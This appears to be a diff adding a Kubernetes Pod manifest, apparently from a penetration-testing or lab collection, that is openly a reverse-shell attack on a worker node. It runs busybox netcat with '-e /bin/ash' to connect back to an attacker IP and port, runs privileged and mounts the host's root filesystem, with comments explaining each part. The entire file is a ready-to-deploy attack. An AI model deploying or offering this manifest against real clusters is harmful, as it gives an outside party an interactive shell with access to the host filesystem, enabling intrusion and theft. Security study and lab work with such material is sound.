@@ -1,0 +1,37 @@
+# pod with reverse she]l - worker node
+apiVersion: v1
+kind: Pod
+metadata:
+  name: busybox
+  namespace: dev
+spec:
+  containers:
+    - name: busybox
+      image: busybox
+      stdin: true
+      tty: true
+      command:
+        # netcat
+        - /bin/nc
+        # attacker device IP address
+        - "192.168.0.110"
+        # port
+        - "3456"
+        # allows executing program and forwards its stdin/out through network connection
+        - "-e"
+        # shell
+        - /bin/ash
+        # adds interactivity
+        - "-i"
+      securityContext:
+        privileged: true
+      volumeMounts:
+        - mountPath: /host
+          name: hostfs
+  volumes:
+    # host filesystem
+    - name: hostfs
+      hostPath:
+        path: /
+        type: Directory
+  restartPolicy: Never
